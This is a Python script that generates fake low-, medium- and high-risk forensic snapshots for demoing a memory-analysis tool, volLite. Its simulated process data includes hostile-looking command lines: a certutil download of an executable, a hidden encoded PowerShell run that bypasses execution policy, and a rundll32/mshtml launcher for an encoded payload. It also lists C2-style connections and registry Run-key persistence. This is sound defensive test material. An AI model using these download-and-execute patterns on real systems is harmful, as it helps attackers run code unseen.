#!/usr/bin/env python3
"""
Demo Data Switcher for volLite
Switch between different risk scenarios for testing
"""

import json
import os
from datetime import datetime

class DemoDataSwitcher:
    def __init__(self):
        self.demo_scenarios = {
            'low_risk': self._get_low_risk_data(),
            'medium_risk': self._get_medium_risk_data(),
            'high_risk': self._get_high_risk_data(),
            'custom': None
        }
    
    def _get_low_risk_data(self):
        """Low risk demo data - normal system behavior"""
        return {
            'processes': [
                {
                    'pid': 4,
                    'name': 'System',
                    'ppid': 0,
                    'path': 'C:\\Windows\\System32\\ntoskrnl.exe',
                    'cmdline': 'System',
                    'signature_status': 'signed'
                },
                {
                    'pid': 1000,
                    'name': 'explorer.exe',
                    'ppid': 4,
                    'path': 'C:\\Windows\\explorer.exe',
                    'cmdline': 'explorer.exe',
                    'signature_status': 'signed'
                },
                {
                    'pid': 2000,
                    'name': 'chrome.exe',
                    'ppid': 1000,
                    'path': 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
                    'cmdline': 'chrome.exe',
                    'signature_status': 'signed'
                }
            ],
            'network': [
                {
                    'remote': '8.8.8.8:53',
                    'protocol': 'UDP'
                },
                {
                    'remote': 'google.com:443',
                    'protocol': 'TCP'
                }
            ],
            'system_info': {
                'registry': [],
                'files': []
            }
        }
    
    def _get_medium_risk_data(self):
        """Medium risk demo data - some suspicious activity"""
        return {
            'processes': [
                {
                    'pid': 4,
                    'name': 'System',
                    'ppid': 0,
                    'path': 'C:\\Windows\\System32\\ntoskrnl.exe',
                    'cmdline': 'System',
                    'signature_status': 'signed'
                },
                {
                    'pid': 1000,
                    'name': 'explorer.exe',
                    'ppid': 4,
                    'path': 'C:\\Windows\\explorer.exe',
                    'cmdline': 'explorer.exe',
                    'signature_status': 'signed'
                },
                {
                    'pid': 1234,
                    'name': 'powershell.exe',
                    'ppid': 1000,
                    'path': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
                    'cmdline': 'powershell.exe -Command Get-Process',
                    'signature_status': 'signed'
                },
                {
                    'pid': 2345,
                    'name': 'certutil.exe',
                    'ppid': 1234,
                    'path': 'C:\\Windows\\System32\\certutil.exe',
                    'cmdline': 'certutil.exe -urlcache -split -f http://example.com/file.exe',
                    'signature_status': 'signed'
                }
            ],
            'network': [
                {
                    'remote': '8.8.8.8:53',
                    'protocol': 'UDP'
                },
                {
                    'remote': 'example.com:80',
                    'protocol': 'TCP'
                },
                {
                    'remote': 'suspicious-site.com:8080',
                    'protocol': 'TCP'
                }
            ],
            'system_info': {
                'registry': [
                    {
                        'key': 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                        'value': 'suspicious.exe',
                        'data': 'C:\\Users\\Public\\suspicious.exe'
                    }
                ],
                'files': [
                    {
                        'path': 'C:\\Users\\Public\\suspicious.exe',
                        'executable': True
                    }
                ]
            }
        }
    
    def _get_high_risk_data(self):
        """High risk demo data - APT compromise simulation"""
        return {
            'processes': [
                {
                    'pid': 4,
                    'name': 'System',
                    'ppid': 0,
                    'path': 'C:\\Windows\\System32\\ntoskrnl.exe',
                    'cmdline': 'System',
                    'signature_status': 'signed'
                },
                {
                    'pid': 1000,
                    'name': 'explorer.exe',
                    'ppid': 4,
                    'path': 'C:\\Windows\\explorer.exe',
                    'cmdline': 'explorer.exe',
                    'signature_status': 'signed'
                },
                {
                    'pid': 1234,
                    'name': 'powershell.exe',
                    'ppid': 1000,
                    'path': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
                    'cmdline': 'powershell.exe -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMQAwAA== -WindowStyle Hidden -ExecutionPolicy Bypass',
                    'signature_status': 'unsigned'
                },
                {
                    'pid': 2345,
                    'name': 'rundll32.exe',
                    'ppid': 1234,
                    'path': 'C:\\Windows\\System32\\rundll32.exe',
                    'cmdline': 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("cmd /c powershell -enc [ENCODED_PAYLOAD]",0,true);',
                    'signature_status': 'signed'
                },
                {
                    'pid': 3456,
                    'name': 'svchost.exe',
                    'ppid': 1234,
                    'path': 'C:\\Users\\Public\\svchost.exe',
                    'cmdline': 'svchost.exe -k netsvcs',
                    'signature_status': 'unsigned'
                }
            ],
            'network': [
                {
                    'remote': '8.8.8.8:53',
                    'protocol': 'UDP'
                },
                {
                    'remote': '203.0.113.1:4444',
                    'protocol': 'TCP'
                },
                {
                    'remote': 'malicious-server.com:8080',
                    'protocol': 'TCP'
                },
                {
                    'remote': 'c2-server.net:1337',
                    'protocol': 'TCP'
                }
            ],
            'system_info': {
                'registry': [
                    {
                        'key': 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                        'value': 'suspicious.exe',
                        'data': 'C:\\Users\\Public\\suspicious.exe'
                    },
                    {
                        'key': 'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                        'value': 'persistent.exe',
                        'data': 'C:\\Windows\\Temp\\persistent.exe'
                    }
                ],
                'files': [
                    {
                        'path': 'C:\\Users\\Public\\suspicious.exe',
                        'executable': True
                    },
                    {
                        'path': 'C:\\Windows\\Temp\\persistent.exe',
                        'executable': True
                    }
                ]
            }
        }
    
    def switch_to_scenario(self, scenario_name):
        """Switch to a specific demo scenario"""
        if scenario_name not in self.demo_scenarios:
            print(f"❌ Unknown scenario: {scenario_name}")
            print(f"Available scenarios: {list(self.demo_scenarios.keys())}")
            return False
        
        scenario_data = self.demo_scenarios[scenario_name]
        if scenario_data is None:
            print(f"❌ Scenario '{scenario_name}' not implemented yet")
            return False
        
        print(f"🔄 Switching to {scenario_name.upper()} RISK scenario...")
        print(f"📊 Data summary:")
        print(f"   Processes: {len(scenario_data['processes'])}")
        print(f"   Network connections: {len(scenario_data['network'])}")
        print(f"   Registry entries: {len(scenario_data['system_info']['registry'])}")
        print(f"   Suspicious files: {len(scenario_data['system_info']['files'])}")
        
        # Save the scenario data
        self._save_scenario_data(scenario_data, scenario_name)
        
        print(f"✅ Switched to {scenario_name} scenario!")
        print(f"📁 Scenario data saved to: demo_scenario_{scenario_name}.json")
        
        return True
    
    def _save_scenario_data(self, data, scenario_name):
        """Save scenario data to a file"""
        filename = f"demo_scenario_{scenario_name}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    
    def load_custom_scenario(self, file_path):
        """Load custom scenario from a JSON file"""
        try:
            with open(file_path, 'r') as f:
                custom_data = json.load(f)
            
            print(f"✅ Loaded custom scenario from: {file_path}")
            print(f"📊 Data summary:")
            print(f"   Processes: {len(custom_data.get('processes', []))}")
            print(f"   Network connections: {len(custom_data.get('network', []))}")
            print(f"   Registry entries: {len(custom_data.get('system_info', {}).get('registry', []))}")
            print(f"   Suspicious files: {len(custom_data.get('system_info', {}).get('files', []))}")
            
            self.demo_scenarios['custom'] = custom_data
            self._save_scenario_data(custom_data, 'custom')
            
            return True
        except Exception as e:
            print(f"❌ Error loading custom scenario: {e}")
            return False
    
    def show_available_scenarios(self):
        """Show all available scenarios"""
        print("📋 Available Demo Scenarios:")
        print("=" * 40)
        
        scenarios = {
            'low_risk': '🟢 Low Risk - Normal system behavior',
            'medium_risk': '🟡 Medium Risk - Some suspicious activity',
            'high_risk': '🔴 High Risk - APT compromise simulation',
            'custom': '⚙️ Custom - Load from JSON file'
        }
        
        for key, description in scenarios.items():
            print(f"  {key}: {description}")
        
        print(f"\n💡 Usage:")
        print(f"  switcher.switch_to_scenario('low_risk')")
        print(f"  switcher.switch_to_scenario('medium_risk')")
        print(f"  switcher.switch_to_scenario('high_risk')")
        print(f"  switcher.load_custom_scenario('path/to/file.json')")

def main():
    """Main function for command-line usage"""
    switcher = DemoDataSwitcher()
    
    print("🎯 volLite Demo Data Switcher")
    print("=" * 35)
    
    switcher.show_available_scenarios()
    
    print(f"\n🔄 Quick Switch Examples:")
    print(f"  switcher.switch_to_scenario('high_risk')  # For APT simulation")
    print(f"  switcher.switch_to_scenario('medium_risk')  # For suspicious activity")
    print(f"  switcher.switch_to_scenario('low_risk')  # For normal behavior")

if __name__ == '__main__':
    main()
